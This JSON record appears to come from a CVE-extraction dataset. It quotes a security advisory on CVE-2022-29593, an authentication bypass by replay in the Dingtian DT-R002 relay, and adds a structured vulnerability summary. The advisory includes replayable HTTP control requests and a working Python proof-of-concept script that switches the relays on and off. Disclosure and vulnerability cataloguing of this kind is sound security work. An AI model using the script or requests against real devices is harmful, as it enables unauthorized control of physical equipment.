```
{
  "guidelines": "1. First verify if the content relates to the CVE specified based on the official description\n2. If the content does not relate to this CVE, respond with \"UNRELATED\"\n3. If no useful vulnerability information is found, respond with \"NOINFO\" \n4. For relevant content, extract:\n   - Root cause of vulnerability\n   - Weaknesses/vulnerabilities present\n   - Impact of exploitation\n   - Attack vectors\n   - Required attacker capabilities/position\n\nAdditional instructions:\n- Preserve original technical details and descriptions\n- Remove unrelated content\n- Translate non-English content to English\n- Note if the content provides more detail than the official CVE description",
  "response": {
    "match": true,
    "data": [
      {
        "content": "=== Content from www.trustwave.com_abd827a4_20250114_234340.html ===\n\n# CVE-2022-29593- Authentication Bypass by Capture Replay (Dingtian-DT-R002)\n\nThe Dingtian (Dingtian DT-R002) 2CH relay, running firmware V3.1.276A contains a vulnerability that if exploited allows an attacker to replay the same data or similar data. This allows the attacker to control the devices attached to the relays without requiring authentication.\n\nIt was found that the device relays could be controlled (turned on and off) through unauthenticated HTTP requests. Due to the use of a cleartext protocol for the sending of command messages, in this case HTTP, it is possible to capture these requests using sniffing techniques.\n\nThe following HTTP control messages were intercepted and subsequently successfully replayed to the Dingtian 2CH relay to effect control of the device:\n\n```\nGET /relay_cgi.cgi?type=0&relay=0&on=1&time=0&pwd=0& HTTP/1.1\nHost: 192.168.7.1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nDNT: 1\nConnection: close\nReferer: http://192.168.7.1/relay_cgi.html\nCookie: session=4463009\n\nResponse\nHTTP/1.1 200 OK\nContent-Type: text/html\nContent-Length: 11\n\n&0&0&0&1&0&\n\n```\n\n***Figure 1.** HTTP request triggering the Dingtian 2CH relay to switch relay to the “ON” state*\n\n```\nGET /relay_cgi.cgi?type=0&relay=0&on=0&time=0&pwd=0& HTTP/1.1\nHost: 192.168.7.1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nDNT: 1\nConnection: close\nReferer: http://192.168.7.1/relay_cgi.html\nCookie: session=4463009\n\nResponse\nHTTP/1.1 200 OK\nContent-Type: text/html\nContent-Length: 11\n\n&0&0&0&0&0&\n\n```\n\n***Figure 2.** HTTP request triggering the Dingtian 2CH relay to switch relay to the “OFF” state*\n\n### Vulnerability\n\nCWE-294 - Authentication Bypass by Capture-Replay\n\n### Known Affected Software Configurations\n\nV3.1.276A (Firmware)\n\n### PoC Code\n\n```\n#!/usr/local/bin/python3\n# Author: Victor Hanna (SpiderLabs)\n# DingTian DT-R002 2CH Smart Relay\n# CWE-294 - Authentication Bypass by Capture-replay\n\nimport requests\nimport re\nimport urllib.parse\nfrom colorama import init\nfrom colorama import Fore, Back, Style\nimport sys\nimport os\nimport time\n\nfrom urllib3.exceptions import InsecureRequestWarning\nrequests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)\n\ndef banner():\n    print (\"[+]********************************************************************************[+]\")\n    print (\"|   Author : Victor Hanna (9lyph)[\"+Fore.RED + \"SpiderLabs\" +Style.RESET_ALL+\"]\\t\\t\\t\\t\\t    |\")\n    print (\"|   Description: DingTian DT-R002 2CH Smart Relay                                      |\")\n    print (\"|   Usage : \"+sys.argv[0]+\" <host>  <relay#>                                    |\")\n    print (\"[+]********************************************************************************[+]\")\n\ndef main():\n    os.system('clear')\n    banner()\n    urlRelay1On = \"http://\"+host+\"/relay_cgi.cgi?type=0&relay=0&on=1&time=0&pwd=0&\"\n    urlRelay1Off = \"http://\"+host+\"/relay_cgi.cgi?type=0&relay=0&on=0&time=0&pwd=0&\"\n    urlRelay2On = \"http://\"+host+\"/relay_cgi.cgi?type=0&relay=1&on=1&time=0&pwd=0&\"\n    urlRelay2Off = \"http://\"+host+\"/relay_cgi.cgi?type=0&relay=1&on=0&time=0&pwd=0&\"\n    headers = {\n        \"Host\": \"\"+host+\"\",\n        \"User-Agent\": \"9lyph/3.0\",\n        \"Accept\": \"*/*\",\n        \"Accept-Language\": \"en-US,en;q=0.5\",\n        \"Accept-Encoding\": \"gzip, deflate\",\n        \"DNT\": \"1\",\n        \"Connection\": \"close\",\n        \"Referer\": \"http://\"+host+\"/relay_cgi.html\",\n        \"Cookie\": \"session=4463009\"\n        }\n    print (Fore.YELLOW + f\"[+] Exploiting\" + Style.RESET_ALL, flush=True, end=\" \")\n    for i in range(5):\n        time.sleep (1)\n        print (Fore.YELLOW + \".\" + Style.RESET_ALL, flush=True, end=\"\")\n    try:\n        if (relay == \"1\"):\n            print (Fore.GREEN + \"\\n[+] Relay 1 switched on !\" + Style.RESET_ALL)\n            r = requests.get(urlRelay1On)\n            time.sleep (5)\n            print (Fore.GREEN + \"[+] Relay 1 switched off !\" + Style.RESET_ALL)\n            r = requests.get(urlRelay1Off)\n            print (Fore.YELLOW + \"PWNED !!!\" + Style.RESET_ALL, flush=True, end=\"\")\n        elif (relay == \"2\"):\n            print (Fore.GREEN + \"[+] Relay 2 switched on !\" + Style.RESET_ALL)\n            r = requests.get(urlRelay2On)\n            time.sleep (5)\n            print (Fore.GREEN + \"[+] Relay 2 switched on !\" + Style.RESET_ALL)\n            r = requests.get(urlRelay2Off)\n            print (Fore.YELLOW + \"PWNED !!!\" + Style.RESET_ALL, flush=True, end=\"\")\n        else:\n             print (Fore.RED + \"[!] No such relay\" + Style.RESET_ALL)\n    except KeyboardInterrupt:\n        sys.exit(1)\n    except requests.exceptions.Timeout:\n        print (\"[!] Connection to host timed out !\")\n        sys.exit(1)\n    except Exception as e:\n        print (Fore.RED + f\"[+] You came up short I'm afraid !\" + Style.RESET_ALL)\n\nif __name__ == \"__main__\":\n    if len(sys.argv)>2:\n        host = sys.argv[1]\n        relay = sys.argv[2]\n        main ()\n    else:\n        print (Fore.RED + f\"[+] Not enough arguments, please specify target and relay!\" + Style.RESET_ALL)\n\n```\n\n***Figure 3.** PoC exploit script*\n\nDescription of an additional ModBus attack vector and details of the device teardown can be found at the researcher’s Github repository linked below.\n\n### References\n\nGithub: <https://github.com/SpiderLabs/advisories-poc/tree/master/CVE-2022-29593>\n\nTWSL Advisory:  [TWSL2022-001: Authentication Bypass by Capture-replay in DingTian 2 Channel Relay Board](/en-us/resources/security-resources/security-advisories/?fid=30299)",
        "root_cause": "The Dingtian DT-R002 relay card uses a cleartext protocol (HTTP) for sending command messages, without proper authentication, making it susceptible to capture-replay attacks.",
        "vulnerabilities": [
          "Authentication Bypass by Capture-Replay (CWE-294)"
        ],
        "impact": "An attacker can control the physical relays of the device (turn on and off) without requiring any authentication.",
        "attack_vectors": [
          "An attacker with access to the IP network can capture HTTP requests sent to the device.",
          "The captured HTTP requests can then be replayed to control the device relays."
        ],
        "attacker_capabilities": "An attacker needs access to the IP network where the vulnerable device is connected. They need to be able to sniff network traffic, and replay the captured requests to control the device."
      }
    ]
  }
}
```